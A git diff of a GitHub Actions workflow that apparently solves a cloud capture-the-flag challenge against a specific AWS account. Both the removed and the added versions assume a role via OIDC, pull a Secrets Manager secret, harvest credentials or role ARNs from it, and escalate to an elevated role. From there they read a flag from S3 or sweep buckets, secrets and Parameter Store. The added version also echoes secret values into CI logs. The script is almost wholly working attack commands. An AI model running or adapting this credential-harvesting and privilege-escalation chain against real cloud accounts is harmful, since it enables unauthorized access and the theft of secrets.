@@ -1,196 +1,124 @@
-name: hexnova-final
+name: AWS OIDC Secret Retrieval
+
 on:
-  workflow_dispatch:
+  workflow_dispatch:  # Manual trigger for testing
+  push:
+    branches: [ main, master ]
+
+# Required for OIDC token generation
+permissions:
+  id-token: write
+  contents: read
 
 jobs:
-  retrace:
-    permissions:
-      id-token: write
-      contents: read
+  retrieve-secrets:
     runs-on: ubuntu-latest
-
-    env:
-      AWS_REGION: us-west-2
-      BUCKET: atr3404-63428fb6
-
+    
     steps:
-      - name: Show runner & AWS CLI
-        run: |
-          set -x
-          uname -a || true
-          aws --version || true
-
-      - name: Configure AWS via OIDC (first hop)
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
-          aws-region: ${{ env.AWS_REGION }}
-          role-session-name: ctf-hexnova
-
-      - name: Verify caller
-        run: aws sts get-caller-identity --output json
-
-      - name: Install jq
-        run: sudo apt-get update && sudo apt-get install -y jq
-
-      - name: Fetch and normalize secret
-        run: |
-          set -euo pipefail
-          aws secretsmanager get-secret-value \
-            --secret-id internal/secrets/id-v2 \
-            --region us-west-2 \
-            --output json > secret_resp.json
-
-          # Raw SecretString
-          jq -r '.SecretString' secret_resp.json > secret_raw.txt
-          echo "Raw SecretString (first 160):"; head -c 160 secret_raw.txt || true; echo
-
-          # Try base64 decode; if it works, use it, otherwise keep raw
-          if base64 -d < secret_raw.txt >/tmp/dec 2>/dev/null; then
-            cp /tmp/dec secret_stage1.txt
-          else
-            cp secret_raw.txt secret_stage1.txt
-          fi
-
-          # If it's JSON-as-string, unwrap repeatedly; otherwise keep as-is
-          cat secret_stage1.txt | jq -c 'try (fromjson) catch .' > secret_stage2.json
-          cat secret_stage2.json | jq -c 'try (fromjson) catch .' > secret.json
-
-          echo "Normalized secret (first 200):"
-          head -c 200 secret.json || true; echo
-
-      - name: Classify + act (creds / role / externalId)
-        run: |
-          set -euo pipefail
-
-          # Deep search helpers
-          has_creds() {
-            jq -e '.. | objects
-              | select(has("AccessKeyId") and has("SecretAccessKey") and has("SessionToken"))
-              | length >= 0' secret.json >/dev/null 2>&1
-          }
-          extract_creds() {
-            jq -r '.. | objects
-              | select(has("AccessKeyId") and has("SecretAccessKey") and has("SessionToken"))
-              | {AccessKeyId,SecretAccessKey,SessionToken} | @tsv' secret.json | head -n1
-          }
-          find_role_arn() {
-            # JSON scalars & objects ↓
-            ARN=$(jq -r '
-              [
-                # any scalar string containing a role ARN
-                (.. | scalars | select(type=="string") | select(test("arn:aws:iam::[0-9]{12}:role/"))),
-                # common fields
-                (.. | objects | .RoleArn?, .roleArn?, .role_arn?, .arn?)
-              ] | flatten | map(select(.!=null)) | .[0] // empty
-            ' secret.json)
-            if [ -z "$ARN" ]; then
-              # Raw text fallback
-              ARN=$(cat secret_stage1.txt | grep -Eo 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_-]+' | head -n1 || true)
-            fi
-            printf '%s' "$ARN"
-          }
-          find_extid() {
-            jq -r '
-              [
-                (.. | objects
-                  | .ExternalId?, .external_id?, .externalId?, ."external-id"?, .extId?, .ext_id?
-                ),
-                (.. | scalars | select(type=="string") | select(test("(?i)ext.*id")))
-              ] | flatten | map(select(.!=null)) | .[0] // empty
-            ' secret.json
-          }
-
-          # 1) STS creds?
-          if has_creds; then
-            read AK SK ST <<<"$(extract_creds)"
-            export AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$ST"
-            echo "== Using creds from secret =="
-            aws sts get-caller-identity --output json
-            aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2
-            exit 0
-          fi
-
-          # 2) Role ARN present?
-          ROLE="$(find_role_arn)"
-          EXT="$(find_extid)"
-          if [ -n "$ROLE" ]; then
-            echo "Detected RoleArn: $ROLE"
-            if [ -n "$EXT" ]; then
-              echo "Detected ExternalId (from secret): <present>"
-              aws sts assume-role \
-                --role-arn "$ROLE" \
-                --role-session-name ctf-hexnova-priv \
-                --external-id "$EXT" \
-                --region us-west-2 \
-                --output json > assume.json
-            else
-              aws sts assume-role \
-                --role-arn "$ROLE" \
-                --role-session-name ctf-hexnova-priv \
-                --region us-west-2 \
-                --output json > assume.json
-            fi
-            export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
-            export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)
-            export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)
-            aws sts get-caller-identity --output json
-            aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2
-            exit 0
-          fi
-
-          # 3) Only ExternalId? Discover matching role by scanning trust policies
-          if [ -n "$EXT" ]; then
-            echo "Only ExternalId found, discovering role via trust policy…"
-            aws iam list-roles --output json > roles.json
-
-            DETECTED_ROLE=""
-            for RN in $(jq -r '.Roles[].RoleName' roles.json); do
-              # get-role returns AssumeRolePolicyDocument which can be object or JSON string
-              aws iam get-role --role-name "$RN" --output json > role_$RN.json
-              ARN=$(jq -er '
-                .Role as $r
-                | ($r.AssumeRolePolicyDocument
-                    | (if type=="string" then (try (fromjson) catch .) else . end)
-                    | (.. | objects | .["sts:ExternalId"]? // .["sts:externalid"]? // empty)
-                    | select(. != null)
-                  )
-                | $r.Arn
-              ' role_$RN.json 2>/dev/null || true)
-              if [ -n "$ARN" ]; then
-                DETECTED_ROLE="$ARN"
-                echo "Detected Role by ExternalId: $DETECTED_ROLE"
-                break
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Configure AWS credentials using OIDC
+      uses: aws-actions/configure-aws-credentials@v4
+      with:
+        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
+        role-session-name: GitHubActions-SecretRetrieval
+        aws-region: us-west-2
+        
+    - name: Verify AWS identity
+      run: |
+        echo "Current AWS identity:"
+        aws sts get-caller-identity
+        
+    - name: Retrieve secret from AWS Secrets Manager
+      run: |
+        echo "Retrieving secret: internal/secrets/id-v2"
+        SECRET_VALUE=$(aws secretsmanager get-secret-value \
+          --secret-id "internal/secrets/id-v2" \
+          --query SecretString \
+          --output text)
+        echo "Secret retrieved successfully"
+        echo "Secret value: $SECRET_VALUE"
+        
+    - name: Parse and use credentials (if JSON format)
+      run: |
+        SECRET_VALUE=$(aws secretsmanager get-secret-value \
+          --secret-id "internal/secrets/id-v2" \
+          --query SecretString \
+          --output text)
+        
+        # Check if it's JSON format with AWS credentials
+        if echo "$SECRET_VALUE" | jq . > /dev/null 2>&1; then
+          echo "Secret is in JSON format"
+          echo "$SECRET_VALUE" | jq .
+          
+          # Extract credentials if they exist
+          ACCESS_KEY=$(echo "$SECRET_VALUE" | jq -r '.aws_access_key_id // .AccessKeyId // empty')
+          SECRET_KEY=$(echo "$SECRET_VALUE" | jq -r '.aws_secret_access_key // .SecretAccessKey // empty')
+          ROLE_ARN=$(echo "$SECRET_VALUE" | jq -r '.role_arn // .RoleArn // empty')
+          
+          if [ ! -z "$ACCESS_KEY" ] && [ ! -z "$SECRET_KEY" ]; then
+            echo "Found AWS credentials in secret"
+            echo "Access Key: $ACCESS_KEY"
+            echo "Secret Key: ${SECRET_KEY:0:10}..."
+            
+            # If there's a role ARN, assume that role
+            if [ ! -z "$ROLE_ARN" ]; then
+              echo "Found role ARN: $ROLE_ARN"
+              echo "Attempting to assume elevated role..."
+              
+              # Configure new credentials
+              export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
+              export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
+              
+              # Assume the elevated role
+              ELEVATED_CREDS=$(aws sts assume-role \
+                --role-arn "$ROLE_ARN" \
+                --role-session-name "ElevatedAccess" \
+                --output json)
+              
+              if [ $? -eq 0 ]; then
+                echo "Successfully assumed elevated role"
+                echo "$ELEVATED_CREDS" | jq .
+                
+                # Extract new temporary credentials
+                export AWS_ACCESS_KEY_ID=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.AccessKeyId')
+                export AWS_SECRET_ACCESS_KEY=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.SecretAccessKey')
+                export AWS_SESSION_TOKEN=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.SessionToken')
+                
+                echo "New identity with elevated role:"
+                aws sts get-caller-identity
+                
+                # Look for flags in common locations
+                echo "Searching for flags with elevated permissions..."
+                
+                # Check S3 buckets
+                echo "=== S3 Buckets ==="
+                aws s3 ls || echo "No S3 access or no buckets"
+                
+                # Check for any accessible S3 objects
+                for bucket in $(aws s3 ls | awk '{print $3}' 2>/dev/null); do
+                  echo "Checking bucket: $bucket"
+                  aws s3 ls s3://$bucket/ --recursive | grep -i flag || true
+                done
+                
+                # Check Secrets Manager for more secrets
+                echo "=== Additional Secrets ==="
+                aws secretsmanager list-secrets || echo "No additional secrets access"
+                
+                # Check Parameter Store
+                echo "=== Parameter Store ==="
+                aws ssm describe-parameters || echo "No parameter store access"
+                
+                # Look for flags in parameters
+                aws ssm get-parameters-by-path --path "/" --recursive || echo "No parameter access"
+                
+              else
+                echo "Failed to assume elevated role"
               fi
-            done
-
-            if [ -z "$DETECTED_ROLE" ]; then
-              echo "::error::Could not find role bound to ExternalId"
-              echo "ExternalId: $EXT"
-              echo "Sample trust policy (first role) for debugging:"
-              jq -r '.Role.AssumeRolePolicyDocument' role_$(jq -r '.Roles[0].RoleName' roles.json).json | head -c 300 || true; echo
-              exit 1
             fi
-
-            aws sts assume-role \
-              --role-arn "$DETECTED_ROLE" \
-              --role-session-name ctf-hexnova-priv \
-              --external-id "$EXT" \
-              --region us-west-2 \
-              --output json > assume.json
-
-            export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
-            export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)
-            export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)
-
-            aws sts get-caller-identity --output json
-            aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2
-            exit 0
           fi
-
-          echo "::error::Unknown secret shape; showing previews:"
-          echo "secret_raw.txt (first 200):"; head -c 200 secret_raw.txt || true; echo
-          echo "secret_stage1.txt (first 200):"; head -c 200 secret_stage1.txt || true; echo
-          echo "secret.json (first 200):"; head -c 200 secret.json || true; echo
-          exit 1
-
+        else
+          echo "Secret is not in JSON format:"
+          echo "$SECRET_VALUE"
+        fi
